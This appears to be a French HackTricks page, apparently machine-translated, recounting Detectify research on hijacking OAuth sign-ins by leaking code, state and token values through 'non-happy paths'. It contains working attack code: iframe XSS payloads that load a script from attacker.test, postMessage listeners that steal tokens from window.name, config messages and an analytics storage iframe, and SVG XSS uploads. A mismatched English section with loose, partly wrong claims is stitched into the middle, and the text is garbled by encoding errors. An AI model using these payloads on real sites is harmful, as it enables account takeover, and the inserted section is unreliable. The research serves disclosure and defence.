# OAuth - Happy Paths, XSS, Iframes & Post Messages pour divulguer des valeurs de code et d'√©tat

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Ce contenu a √©t√© extrait de** [**https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url**](https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)****

## Explication des diff√©rentes danses OAuth

### Types de r√©ponse

Tout d'abord, il existe diff√©rents types de r√©ponse que vous pouvez utiliser dans la danse OAuth. Ces r√©ponses accordent le **jeton pour se connecter en tant qu'utilisateur ou les informations n√©cessaires pour le faire**.

Les trois plus courants sont :

1. **`code` + `state`**. Le **code** est utilis√© pour **appeler le serveur du fournisseur OAuth** pour obtenir un jeton. Le param√®tre **state** est utilis√© pour v√©rifier que **l'utilisateur correct effectue l'appel**. Il incombe au client OAuth de valider le param√®tre d'√©tat avant de faire l'appel c√¥t√© serveur au fournisseur OAuth.
2. **`id_token`**. Est un jeton Web JSON **(JWT) sign√©** √† l'aide d'un certificat public du fournisseur OAuth pour v√©rifier que l'identit√© fournie est bien celle qu'elle pr√©tend √™tre.
3. **`token`**. Est un **jeton d'acc√®s** utilis√© dans l'API du fournisseur de services.

### Modes de r√©ponse

Il existe diff√©rents modes que le flux d'autorisation pourrait utiliser pour fournir les codes ou jetons au site Web dans la danse OAuth, voici quatre des plus courants :

1. **Query**. Envoi de param√®tres de requ√™te en tant que redirection vers le site Web (`https://example.com/callback?code=xxx&state=xxx`). Utilis√© pour `code+state`. Le **code** ne peut √™tre **utilis√© qu'une seule fois** et vous avez besoin du **secret client OAuth** pour **acqu√©rir un jeton d'acc√®s** lors de l'utilisation du code.&#x20;
   1. [Ce mode n'est pas recommand√© pour les jetons](https://openid.net/specs/oauth-v2-multiple-response-types-1\_0-09.html#id\_token) car **les jetons peuvent √™tre utilis√©s plusieurs fois et ne doivent pas se retrouver dans les journaux du serveur ou similaires**. La plupart des fournisseurs OAuth ne prennent pas en charge ce mode pour les jetons, uniquement pour le code. Exemples :
      * `response_mode=query` est utilis√© par Apple.
        * `response_type=code` est utilis√© par Google ou Facebook.
2. **Fragment**. Utilisation d'une **redirection de fragment** (`https://example.com/callback#access_token=xxx`). Dans ce mode, la partie fragment de l'URL ne se retrouve dans aucun journal du serveur et ne peut √™tre atteinte que c√¥t√© client √† l'aide de javascript. Ce mode de r√©ponse est utilis√© pour les jetons. Exemples :
   * `response_mode=fragment` est utilis√© par Apple et Microsoft.
   * `response_type` contient `id_token` ou `token` et est utilis√© par Google, Facebook, Atlassian et d'autres.
3. **Web-message**. Utilisation de **postMessage vers une origine fixe du site Web** :\
   `postMessage('{"access_token":"xxx"}','https://example.com')`\
   Si elle est prise en charge, elle peut souvent √™tre utilis√©e pour tous les types de r√©ponse diff√©rents. Exemples :
   * `response_mode=web_message` est utilis√© par Apple.
   * `redirect_uri=storagerelay://...` est utilis√© par Google.
   * `redirect_uri=https://staticxx.facebook.com/.../connect/xd_arbiter/...` est utilis√© par Facebook.
4. **Form-post**. Utilisation d'un envoi de formulaire vers une `redirect_uri` valide, une **requ√™te POST r√©guli√®re est renvoy√©e au site Web**. Cela peut √™tre utilis√© pour le code et les jetons. Exemples :
   * `response_mode=form_post` est utilis√© par Apple.
   * `ux_mode=redirect&login_uri=https://example.com/callback` est utilis√© par Google Sign-In (GSI).

## Casser intentionnellement `state` <a href="#break-state-intentionally" id="break-state-intentionally"></a>

La sp√©cification OAuth recommande un param√®tre `state` en combinaison avec un `response_type=code` pour s'assurer que l'utilisateur qui a initi√© le flux est √©galement celui qui utilise le code apr√®s la danse OAuth pour √©mettre un jeton.

Cependant, si la **valeur de `state` est invalide**, le **`code` ne sera pas consomm√©** car c'est la **responsabilit√© du site Web (la derni√®re) de valider l'√©tat**. Cela signifie que si un attaquant peut envoyer un lien de flux de connexion √† une victime contamin√©e avec un `state` valide de l'attaquant, la danse OAuth √©chouera pour la victime et le `code` ne sera jamais envoy√© au fournisseur OAuth. Le code sera toujours possible √† utiliser si l'attaquant peut l'obtenir.

1. L'attaquant d√©marre un flux de connexion sur le site Web en utilisant "Se connecter avec X".
2. L'attaquant utilise la valeur `state` et construit un lien pour que la victime se connecte avec le fournisseur OAuth mais avec l'√©tat de l'attaquant.
3. La victime se connecte avec le lien et est redirig√©e vers le site Web.
4. Le site Web valide l'√©tat pour la victime et arr√™te le traitement du flux de connexion car ce n'est
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow
```
redirigera vers `https://example.com/callback?code=xxx&state=yyy`. Mais:
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code,id_token&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow
```
redirigera vers `https://example.com/callback#code=xxx&state=yyy&id_token=zzz`.

La m√™me id√©e s'applique √† Apple si vous utilisez:
```
https://appleid.apple.com/auth/authorize?
response_type=code&
response_mode=query&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
```
vous serez redirig√© vers `https://example.com/callback?code=xxx&state=yyy`, mais:
```
https://appleid.apple.com/auth/authorize?
response_type=code+id_token&
response_mode=fragment&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
```
Vous serez redirig√© vers `https://example.com/callback#code=xxx&state=yyy&id_token=zzz`.

## Chemins Non-Heureux

L'auteur de la recherche a appel√© **chemins non-heureux les URL erron√©es o√π l'utilisateur se connecte via OAuth**. Cela est utile car si le client re√ßoit le jeton ou un √©tat+code valide **mais qu'il n'atteint pas la page attendue**, cette **information ne sera pas correctement consomm√©e** et si l'attaquant trouve un moyen d'**exfiltrer cette information** du "chemin non-heureux", il pourra **prendre le contr√¥le du compte**.

Par d√©faut, le flux OAuth atteindra le chemin attendu, cependant, il pourrait y avoir des **mauvaises configurations potentielles** qui pourraient permettre √† un attaquant de **cr√©er une demande OAuth initiale sp√©cifique** qui fera que l'utilisateur atteindra un chemin non-heureux apr√®s s'√™tre connect√©.

### Incompatibilit√©s d'URI de redirection

Ces **mauvaises configurations** "communes" ont √©t√© trouv√©es dans l'**URL de redirection** de la communication OAuth.

La [**sp√©cification**](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-19#section-2.1) **** indique strictement que l'URL de redirection doit √™tre strictement compar√©e √† celle d√©finie, ne permettant pas de modifications autres que l'apparition ou non du port. Cependant, certains points d'extr√©mit√© permettaient certaines modifications :

### Ajout de chemin d'URI de redirection

Certains fournisseurs OAuth **permettent l'ajout de donn√©es suppl√©mentaires** au chemin pour `redirect_uri`. Cela enfreint √©galement la sp√©cification de la m√™me mani√®re que pour "Changement de cas d'URI de redirection". Par exemple, en ayant un URI de redirection `https://example.com/callback`, en envoyant :
```
response_type=id_token&
redirect_uri=https://example.com/callbackxxx
```
### Ajout de param√®tres de redirection-uri

Certains fournisseurs OAuth **permettent l'ajout de param√®tres de requ√™te ou de fragment suppl√©mentaires** √† l'URI de redirection. Vous pouvez utiliser cela en d√©clenchant un chemin non-happy en fournissant les m√™mes param√®tres qui seront ajout√©s √† l'URL. Par exemple, en ayant une URI de redirection `https://example.com/callback`, en envoyant :
```
response_type=code&
redirect_uri=https://example.com/callback%3fcode=xxx%26
```
Le r√©sultat dans ces cas serait une redirection vers `https://example.com/callback?code=xxx&code=real-code`. Selon le site web recevant **plusieurs param√®tres avec le m√™me nom, cela pourrait √©galement d√©clencher un chemin non-happy**. La m√™me chose s'applique √† `token` et `id_token`:
```
response_type=code&
redirect_uri=https://example.com/callback%23id_token=xxx%26
```
### Chemins heureux OAuth, XSS, iframes et messages POST pour divulguer des valeurs de code et d'√©tat

## Restes ou mauvaises configurations de redirect-uri

En collectant toutes les URL de connexion contenant les valeurs `redirect_uri`, je pourrais √©galement tester si d'autres valeurs de redirect-uri √©taient √©galement valides. Sur les 125 flux de connexion diff√©rents de Google que j'ai enregistr√©s √† partir des sites Web que j'ai test√©s, 5 sites Web avaient √©galement la page de d√©marrage comme `redirect_uri` valide. Par exemple, si `redirect_uri=https://auth.example.com/callback` √©tait celui utilis√©, dans ces 5 cas, n'importe lequel de ceux-ci √©tait √©galement valide :

* `redirect_uri=https://example.com/`
* `redirect_uri=https://example.com`
* `redirect_uri=https://www.example.com/`
* `redirect_uri=https://www.example.com`

Cela √©tait particuli√®rement int√©ressant pour les sites Web qui utilisaient r√©ellement `id_token` ou `token`, car `response_type=code` aura toujours le fournisseur OAuth validant le `redirect_uri` dans la derni√®re √©tape de la danse OAuth lors de l'acquisition d'un jeton.

## Gadget 1 : √âcouteurs postMessage avec v√©rification d'origine faible ou inexistante qui divulguent l'URL

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget-1-1024x582.png)

**Dans cet exemple, le dernier chemin non heureux o√π le jeton/code √©tait envoy√© envoyait un message de demande POST divulguant location.href.**\
Un exemple √©tait un SDK d'analyse pour un site populaire qui √©tait charg√© sur des sites Web :

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example1.png)

Ce SDK exposait un √©couteur postMessage qui envoyait le message suivant lorsque le type de message correspondait :

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example2.png)

En envoyant un message √† partir d'une origine diff√©rente :
```javascript
openedwindow = window.open('https://www.example.com');
...
openedwindow.postMessage('{"type":"sdk-load-embed"}','*');
```
Un message de r√©ponse appara√Ætrait dans la fen√™tre qui a envoy√© le message contenant `location.href` du site web :

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example3.png)

Le flux qui pourrait √™tre utilis√© dans une attaque d√©pendait de la fa√ßon dont les codes et les jetons √©taient utilis√©s pour le flux de connexion, mais l'id√©e √©tait la suivante :

### **Attaque**

1. L'attaquant envoie √† la victime un **lien pr√©par√©** qui a √©t√© pr√©par√© pour **r√©sulter en un chemin non heureux** dans la danse OAuth.
2. La victime **clique** sur le lien. Une nouvelle fen√™tre s'ouvre avec un **flux de connexion** avec l'un des fournisseurs OAuth du site web qui est exploit√©.
3. Le chemin non heureux est d√©clench√© sur le site web qui est exploit√©, le **listener postMessage vuln√©rable est charg√© sur la page sur laquelle la victime a atterri, toujours avec le code ou les jetons dans l'URL**.
4. L'**onglet original** envoy√© par l'attaquant envoie une s√©rie de **postMessages** √† la nouvelle fen√™tre avec le site web pour obtenir le listener postMessage pour divulguer l'URL actuelle.
5. L'onglet original envoy√© par l'attaquant **√©coute ensuite le message qui lui est envoy√©**. Lorsque l'URL revient dans un message, le **code et le jeton sont extraits** et envoy√©s √† l'attaquant.
6. **L'attaquant se connecte en tant que victime** en utilisant le code ou le jeton qui a fini sur le chemin non heureux.

## Gadget 2 : XSS sur un domaine sandbox/tiers qui obtient l'URL

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget-2-1024x582.png)

&#x20;

## **Gadget 2 : exemple 1, vol de window.name √† partir d'un iframe sandbox**

Celui-ci avait un **iframe** charg√© sur la **page o√π la danse OAuth s'est termin√©e**. Le **nom** de l'**iframe** √©tait une **version JSON-stringifi√©e de l'objet `window.location`**. C'est une ancienne fa√ßon de transf√©rer des donn√©es entre domaines, car la page dans l'iframe peut obtenir son propre `window.name` d√©fini par le parent :
```javascript
i = document.createElement('iframe');
i.name = JSON.stringify(window.location)
i.srcdoc = '<script>console.log("my name is: " + window.name)</script>';
document.body.appendChild(i)
```
Le domaine charg√© dans l'**iframe avait √©galement une XSS simple**:
```
https://examplesandbox.com/embed_iframe?src=javascript:alert(1)
```
### Attaque

Si vous avez un **XSS** sur un **domaine** dans une fen√™tre, cette fen√™tre peut alors **atteindre d'autres fen√™tres de la m√™me origine** s'il y a une relation parent/enfant/opener entre les fen√™tres.

Cela signifie qu'un attaquant pourrait **exploiter le XSS pour charger un nouvel onglet** avec le **lien OAuth** cr√©√© qui **se terminera** dans le **chemin** qui **charge** l'**iframe avec le jeton dans le nom**. Ensuite, √† partir de la page exploit√©e par XSS, il sera possible de **lire le nom de l'iframe** car il a un **opener sur la page parente des iframes** et de l'exfiltrer.

Plus pr√©cis√©ment :

1. Cr√©ez une page malveillante qui int√®gre une iframe du sandbox avec le XSS chargeant mon propre script :

    ```html
    <div id="leak"><iframe src="https://examplesandbox.com/embed_iframe?src=javascript:
    x=createElement('script'),
    x.src='//attacker.test/inject.js',
    document.body.appendChild(x);" 
    style="border:0;width:500px;height:500px"></iframe></div>
    ```
2. Dans mon script charg√© dans le sandbox, j'ai remplac√© le contenu par le lien √† utiliser pour la victime :

    ```javascript
    document.body.innerHTML = 
    '<a href="#" onclick="
    b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
    Cliquez ici pour d√©tourner le jeton</a>';
    ```

    J'ai √©galement d√©marr√© un script dans un intervalle pour v√©rifier si le lien √©tait ouvert et si l'iframe que je voulais atteindre √©tait l√† pour obtenir le `window.name` d√©fini sur l'iframe avec la m√™me origine que l'iframe sur la page de l'attaquant :

    ```javascript
    x = setInterval(function() {
    if(parent.window.b &&
     parent.window.b.frames[0] &&
     parent.window.b.frames[0].window &&
     parent.window.b.frames[0].window.name) {
       top.postMessage(parent.window.b.frames[0].window.name, '*');
       parent.window.b.close();
       clearInterval(x);
    }
    }, 500);
    ```
3. La page de l'attaquant peut alors simplement √©couter le message que nous venons d'envoyer avec le `window.name` :

    ```html
    <script>
    window.addEventListener('message', function (e) {
     if (e.data) {
         document.getElementById('leak').innerText = 'Nous avons vol√© le jeton : ' + e.data;
     }
    });
    </script>
    ```

## **Gadget 2 : exemple 2, iframe avec XSS + v√©rification de l'origine parentale**

Le deuxi√®me exemple √©tait une **iframe** charg√©e sur le **chemin non heureux** avec un XSS **utilisant postMessage**, mais les **messages n'√©taient autoris√©s que depuis la fen√™tre `parent`** qui l'a charg√©. Le **`location.href` a √©t√© envoy√© √† l'iframe lorsqu'elle a demand√© `initConfig`** dans un message √† la fen√™tre `parent`.

La fen√™tre principale a charg√© l'iframe comme ceci :
```html
<iframe src="https://challenge-iframe.example.com/"></iframe>
```
# OAuth Happy Paths: XSS, iframes and post messages to leak code and state values

## Introduction

In this section we will see how to exploit some happy paths of OAuth to leak code and state values. We will use XSS, iframes and post messages to achieve this.

## OAuth Happy Paths

### Authorization Code Grant

#### Authorization Request

The authorization request is the first step in the Authorization Code Grant flow. It is sent by the client to the authorization server and includes the following parameters:

- `response_type`: This parameter must be set to `code`.
- `client_id`: The client identifier issued to the client during the registration process.
- `redirect_uri`: The URI to which the authorization server will send the user-agent back once access is granted or denied.
- `scope`: The scope of the access request.
- `state`: An opaque value used by the client to maintain state between the request and callback.

#### Authorization Response

The authorization server responds to the authorization request by returning an authorization code. The authorization code is a temporary code that the client will exchange for an access token.

### Exploiting the Authorization Request

#### XSS

An attacker can inject an XSS payload in the `state` parameter of the authorization request. When the authorization server sends the `state` parameter back to the client, the XSS payload will be executed in the context of the client's domain.

#### Iframes

An attacker can use an iframe to load the authorization request. The iframe can be hidden and the user will not notice that the authorization request has been sent. The attacker can then use post messages to communicate with the iframe and extract the authorization code and state values.

#### Post Messages

An attacker can use post messages to communicate with the authorization server and extract the authorization code and state values. The attacker can use an iframe to load the authorization request and then use post messages to extract the authorization code and state values.

## Conclusion

In this section we have seen how to exploit some happy paths of OAuth to leak code and state values. We have used XSS, iframes and post messages to achieve this. It is important to note that these attacks can be prevented by implementing proper input validation and output encoding.
```html
<script>
window.addEventListener('message', function (e) {
  if (e.source !== window.parent) {
    // not a valid origin to send messages
    return;
  }
  if (e.data.type === 'loadJs') {
    loadScript(e.data.jsUrl);
  } else if (e.data.type === 'initConfig') {
    loadConfig(e.data.config);
  }
});
</script>
```
### Attaque

Dans ce cas, l'attaquant charge un iframe avec la page vuln√©rable Post-message XSS et exploite la XSS pour charger du JS arbitraire. Ce JS ouvre un onglet avec le lien OAuth. Apr√®s la connexion, la page finale contient le jeton dans l'URL et a charg√© un iframe (l'iframe vuln√©rable Post-message XSS).

Ensuite, le JS arbitraire (de la XSS exploit√©e) a un ouvreur pour cet onglet, donc il acc√®de √† l'iframe et le fait demander au parent le `initConfig` (qui contient l'URL avec le jeton). La page parente le donne √† l'iframe, qui est √©galement command√© pour le divulguer.

Dans ce cas, je pourrais utiliser une m√©thode similaire √† l'exemple pr√©c√©dent :

1. Cr√©er une page malveillante qui int√®gre un iframe du sandbox, attacher un `onload` pour d√©clencher un script lorsque l'iframe est charg√©.

    ```html
    <div id="leak"><iframe
    id="i" name="i"
    src="https://challenge-iframe.example.com/"
    onload="run()"
    style="border:0;width:500px;height:500px"></iframe></div>
    ```
2. Puisque la page malveillante est alors le parent de l'iframe, elle peut envoyer un message √† l'iframe pour charger notre script dans l'origine du sandbox en utilisant `postMessage (XSS)` :

    ```html
    <script>
    function run() {
      i.postMessage({type:'loadJs',jsUrl:'https://attacker.test/inject.js'}, '*')
    }
    </script>
    ```
3. Dans mon script charg√© dans le sandbox, j'ai remplac√© le contenu par le lien pour la victime :

    ```javascript
    document.body.innerHTML = '<a href="#" onclick="
    b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
    Cliquez ici pour d√©tourner le jeton</a>';
    ```

    J'ai √©galement d√©marr√© un script dans un intervalle pour v√©rifier si le lien √©tait ouvert et si l'iframe que je voulais atteindre √©tait l√†, pour ex√©cuter du javascript √† l'int√©rieur de celui-ci depuis mon iframe vers la fen√™tre principale. J'ai ensuite attach√© un √©couteur de postMessage qui a transmis le message √† mon iframe dans la fen√™tre malveillante :

    ```javascript
    x = setInterval(function() {
      if(b && b.frames[1]) {
        b.frames[1].eval(
          'onmessage=function(e) { top.opener.postMessage(e.data, "*") };' +
          'top.postMessage({type:'initConfig'},"*")'
        )
        clearInterval(x)
      }
    }, 500);
    ```
4. La page de l'attaquant qui avait l'iframe charg√© peut alors √©couter le message que j'ai envoy√© depuis le proxy de l'√©couteur postMessage inject√© dans l'iframe de la fen√™tre principale :

    ```html
    <script>
    window.addEventListener('message', function (e) {
     if (e.data) {
         document.getElementById('leak').innerText = 'Nous avons vol√© le jeton : ' + JSON.stringify(e.data);
     }
    });
    </script>
    ```

## Gadget 3 : Utilisation d'API pour r√©cup√©rer une URL hors limites

![](https://labs.detectify.com/wp-content/uploads/2022/06/Gadget-3--1024x582.png)

Ce gadget s'est av√©r√© √™tre le plus amusant. Il y a quelque chose de satisfaisant √† envoyer la victime quelque part et √† r√©cup√©rer des donn√©es sensibles √† partir d'un emplacement diff√©rent.

## **Gadget 3 : exemple 1, iframe de stockage sans v√©rification d'origine**

Le premier exemple utilisait un service externe pour les donn√©es de suivi. Ce service a ajout√© un "iframe de stockage" :
```html
<iframe
  id="tracking"
  name="tracking"
  src="https://cdn.customer1234.analytics.example.com/storage.html">
</iframe>
```
La fen√™tre principale communiquerait avec cet iframe en utilisant postMessage pour envoyer des donn√©es de suivi qui seraient enregistr√©es dans le localStorage de l'origine o√π se trouvait `storage.html`:
```javascript
tracking.postMessage('{"type": "put", "key": "key-to-save", "value": "saved-data"}', '*');
```
La fen√™tre principale pourrait √©galement r√©cup√©rer ce contenu:
```javascript
tracking.postMessage('{"type": "get", "key": "key-to-save"}', '*');
```
Lorsque l'iframe a √©t√© charg√©e lors de l'initialisation, une cl√© a √©t√© enregistr√©e pour la derni√®re position de l'utilisateur en utilisant `location.href`:
```javascript
tracking.postMessage('{"type": "put", "key": "last-url", "value": "https://example.com/?code=test#access_token=test"}', '*');
```
Si vous pouviez parler avec cette origine d'une mani√®re ou d'une autre et la convaincre de vous envoyer le contenu, le `location.href` pourrait √™tre r√©cup√©r√© √† partir de ce stockage. Le postMessage-listener pour le service avait une liste de blocage et une liste d'autorisation d'origines. Il semble que le service d'analyse ait permis au site web de d√©finir quelles origines autoriser ou refuser.
```javascript
var blockList = [];
var allowList = [];
var syncListeners = [];

window.addEventListener('message', function(e) {
  // If there's a blockList, check if origin is there and if so, deny
  if (blockList && blockList.indexOf(e.origin) !== -1) {
    return;
  }
  // If there's an allowList, check if origin is there, else deny
  if (allowList && allowList.indexOf(e.origin) == -1) {
    return;
  }
  // Only parent can talk to it
  if (e.source !== window.parent) {
    return;
  }
  handleMessage(e);
});

function handleMessage(e) {
  if (data.type === 'sync') {
    syncListeners.push({source: e.source, origin: e.origin})
  } else {
  ...
}

window.addEventListener('storage', function(e) {
  for(var i = 0; i < syncListeners.length; i++) {
    syncListeners[i].source.postMessage(JSON.stringify({type: 'sync', key: e.key, value: e.newValue}), syncListeners[i].origin);
  }
}
```
De plus, si vous aviez une origine valide bas√©e sur la `allowList`, vous pourriez √©galement demander une synchronisation, ce qui vous donnerait toutes les modifications apport√©es au localStorage dans cette fen√™tre envoy√©es lorsque celles-ci ont √©t√© effectu√©es.

### Attaque

Sur le site web qui avait ce stockage charg√© sur le chemin non-happy de la danse OAuth, aucune origine de la `allowList` n'√©tait d√©finie; **cela permettait √† n'importe quelle origine de parler avec le listener postMessage** si l'origine √©tait le `parent` de la fen√™tre :

1.  J'ai cr√©√© une page malveillante qui a int√©gr√© un iframe du conteneur de stockage et a attach√© un onload pour d√©clencher un script lorsque l'iframe est charg√©.

    ```html
    <div id="leak"><iframe
    id="i" name="i"
    src="https://cdn.customer12345.analytics.example.com/storage.html"
    onload="run()"></iframe></div>
    ```
2.  √âtant donn√© que la page malveillante √©tait maintenant le parent de l'iframe, et qu'aucune origine n'√©tait d√©finie dans la `allowList`, la page malveillante pouvait envoyer des messages √† l'iframe pour dire au stockage d'envoyer des messages pour toutes les mises √† jour du stockage. Je pouvais √©galement ajouter un √©couteur √† la page malveillante pour √©couter toutes les mises √† jour de synchronisation provenant du stockage :

    ```html
    <script>
    function run() {
      i.postMessage({type:'sync'}, '*')
    }
    window.addEventListener('message', function (e) {
     if (e.data && e.data.type === 'sync') {
         document.getElementById('leak').innerText = 'Nous avons vol√© le jeton : ' + JSON.stringify(e.data);
     }
    });
    </script>
    ```
3.  La page malveillante contiendrait √©galement un lien r√©gulier pour que la victime clique :

    ```html
    <a href="https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?..."
    target="_blank">Cliquez ici pour pirater le jeton</a>';
    ```
4.  La victime cliquerait sur le lien, passerait par la danse OAuth, et finirait sur le chemin non-happy chargeant le script de suivi et l'iframe de stockage. L'iframe de stockage re√ßoit une mise √† jour de `last-url`. L'√©v√©nement `window.storage` d√©clencherait dans l'iframe de la page malveillante puisque le localStorage a √©t√© mis √† jour, et la page malveillante qui recevait maintenant des mises √† jour chaque fois que le stockage changeait recevrait un postMessage avec l'URL actuelle de la victime :

    <figure><img src="https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example2.png" alt=""><figcaption></figcaption></figure>

## **Gadget 3: exemple 2, m√©lange de clients dans CDN - DIY stockage-SVG sans v√©rification d'origine**

Puisque le service d'analyse lui-m√™me avait une prime de bug, j'√©tais √©galement int√©ress√© √† voir si je pouvais trouver un moyen de divulguer des URL √©galement pour les sites web qui avaient configur√© des origines appropri√©es pour l'iframe de stockage.

Lorsque j'ai commenc√© √† chercher le domaine `cdn.analytics.example.com` en ligne sans la partie client, j'ai remarqu√© que ce CDN contenait √©galement des images t√©l√©charg√©es par les clients du service :
```
https://cdn.analytics.example.com/img/customer42326/event-image.png
https://cdn.analytics.example.com/img/customer21131/test.png
```
J'ai √©galement remarqu√© que des fichiers SVG √©taient servis en ligne en tant que `Content-type: image/svg+xml` sur ce CDN:
```
https://cdn.analytics.example.com/img/customer54353/icon-register.svg
```
Je me suis inscrit en tant qu'utilisateur d'essai sur le service et j'ai t√©l√©charg√© ma propre ressource, qui est √©galement apparue sur le CDN :
```
https://cdn.analytics.example.com/img/customer94342/tiger.svg
```
La partie int√©ressante √©tait que, si vous utilisiez ensuite le sous-domaine sp√©cifique au client pour le CDN, l'image √©tait toujours servie. Cette URL a fonctionn√©:
```
https://cdn.customer12345.analytics.example.com/img/customer94342/tiger.svg
```
Cela signifiait que le client avec l'ID #94342 pouvait afficher des fichiers SVG dans le stockage du client #12345.

J'ai t√©l√©charg√© un fichier SVG avec une charge utile XSS simple :

`https://cdn.customer12345.analytics.example.com/img/customer94342/test.svg`
```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 500 500" width="100%" height="100%" version="1.1">
<script xlink:href="data:,alert(document.domain)"></script>
</svg>
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example7.png)

Pas g√©nial. Le CDN a ajout√© un en-t√™te `Content-Security-Policy: default-src 'self'` √† tout ce qui se trouve sous `img/`. On pouvait √©galement voir que l'en-t√™te du serveur mentionnait S3 - r√©v√©lant que le contenu avait √©t√© t√©l√©charg√© dans un bucket S3 :

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example5.png)

Une particularit√© int√©ressante de S3 est que les r√©pertoires ne sont pas vraiment des r√©pertoires dans S3 ; le chemin avant la cl√© est appel√© un "pr√©fixe". Cela signifie que S3 ne se soucie pas si les `/` sont encod√©s en URL ou non, il servira toujours le contenu si vous encodez chaque slash dans l'URL. Si je changeais `img/` en `img%2f` dans l'URL, l'image serait toujours r√©solue. Cependant, dans ce cas, l'en-t√™te CSP a √©t√© supprim√© et le XSS a √©t√© d√©clench√© :

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example6.png)

J'ai ensuite t√©l√©charg√© un SVG qui cr√©erait la m√™me forme de gestionnaire de stockage et de listener postMessage que le `storage.html` r√©gulier, mais avec une `allowList` vide. Cela m'a permis de faire le m√™me type d'attaque m√™me sur des sites web qui avaient correctement d√©fini les origines autoris√©es qui pouvaient parler au stockage.

J'ai t√©l√©charg√© un SVG qui ressemblait √† ceci : 

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example7.png)
```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 5 5" width="100%" height="100%" version="1.1">
<script xlink:href="data:application/javascript;base64,dmFyIGJsb2NrTGlzdCA9IFtdOwp2YXIgYWxsb3dMaXN0ID0gW107Ci4uLg=="></script>
</svg>
```
Je pourrais alors utiliser la m√™me m√©thodologie que dans l'exemple #1, mais au lieu d'encadrer `storage.html`, je pourrais simplement encadrer le SVG avec la barre oblique encod√©e en URL:
```html
<div id="leak"><iframe
id="i" name="i"
src="https://cdn.customer12345.analytics.example.com/img%2fcustomer94342/listener.svg"
onload="run()"></iframe></div>
```
Comme aucun site web ne serait capable de corriger cela lui-m√™me, j'ai envoy√© un rapport au fournisseur d'analyse responsable du CDN √† la place :

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example7.png)

L'id√©e de regarder les bugs de configuration incorrecte chez les tiers √©tait principalement de confirmer qu'il existe plusieurs fa√ßons de faire fuiter les jetons et que le tiers avait une prime de bug, ce qui en faisait juste un r√©cepteur diff√©rent pour le m√™me type de bug, la diff√©rence √©tant que l'impact √©tait pour tous les clients du service d'analyse. Dans ce cas, le client du tiers avait en fait la capacit√© de configurer correctement l'outil pour ne pas le faire fuiter de donn√©es √† l'attaquant. Cependant, √©tant donn√© que les donn√©es sensibles √©taient toujours envoy√©es au tiers, il √©tait int√©ressant de voir s'il existait un moyen de contourner compl√®tement la configuration correcte de l'outil par le client.

## **Gadget 3 : exemple 3, API de chat-widget**

